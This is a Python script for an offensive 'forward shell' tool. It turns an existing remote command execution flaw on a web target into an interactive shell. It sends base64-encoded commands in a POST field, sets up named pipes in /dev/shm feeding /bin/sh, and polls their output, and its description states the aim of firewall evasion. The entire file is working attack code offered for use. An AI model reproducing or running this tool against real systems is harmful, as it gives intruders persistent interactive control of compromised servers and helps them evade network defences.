import requests
import argparse
import base64
import threading
import time

class Forward_Shell:
    def __init__(self,target):
        self.url = target
        self.input = "/dev/shm/input"
        self.output = "/dev/shm/output"
        self.remove_files()
        self.makefifo()

        self.thread = threading.Thread(target=self.readoutput, args=()) 
        self.thread.daemon = True
        self.thread.start()

        self.write_cmd()
        
    def remove_files(self):
        remove_files = "rm " + self.input + ";rm " + self.output
        remove_files_encoded = self.base64encode(remove_files)
        self.exploit(remove_files_encoded)

    def base64encode(self,string):
        string_bytes = string.encode("ascii")
        base64_bytes = base64.b64encode(string_bytes)
        base64_string = base64_bytes.decode("ascii")

        return base64_string

    def makefifo(self):
        make_fifo = "mkfifo " + self.input + "; tail -f " + self.input + " | /bin/sh 2>&1 > " + self.output
        make_fifo_encoded = self.base64encode(make_fifo)
        self.exploit(make_fifo_encoded)

    def exploit(self,cmd):
        requests.packages.urllib3.disable_warnings()
        payload = {
            "rse": "echo " + cmd + " | base64 -d | sh" #Change URL parameter here
        }  

        try:
            req_site = requests.post(self.url, data=payload, verify=False,timeout=1)
            return req_site.text.strip()
        except:
            pass

    def readoutput(self):
        read_file = "/bin/cat " + self.output
        read_file_encoded = self.base64encode(read_file)
        while True:
            output = self.exploit(read_file_encoded) 
            if output:
                print(output)
                clear_file = "echo -n '' > " + self.output
                clear_file_encoded = self.base64encode(clear_file)
                self.exploit(clear_file_encoded)
            time.sleep(1)

    def write_cmd(self):
        requests.packages.urllib3.disable_warnings()
        while True:
            try:
                rce = input("RCE: ")
                rce = rce + "\n"
                rce_encoded = self.base64encode(rce)
                payload = {
                    "rse":"echo " + rce_encoded + " | base64 -d > " + self.input #Change URL parameter here
                }

                requests.post(self.url, data=payload, verify=False)
                time.sleep(2.5)

            except KeyboardInterrupt:
                self.remove_files()
                print("\nBye Bye!")
                exit()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='RCE Forward Shell using mkfifo for firewall evasion')
    parser.add_argument('-t', metavar='<Target URL>', help='Example: -t http://rcefile.location/example.php?', required=True)
    args = parser.parse_args()
    
    Forward_Shell(args.t)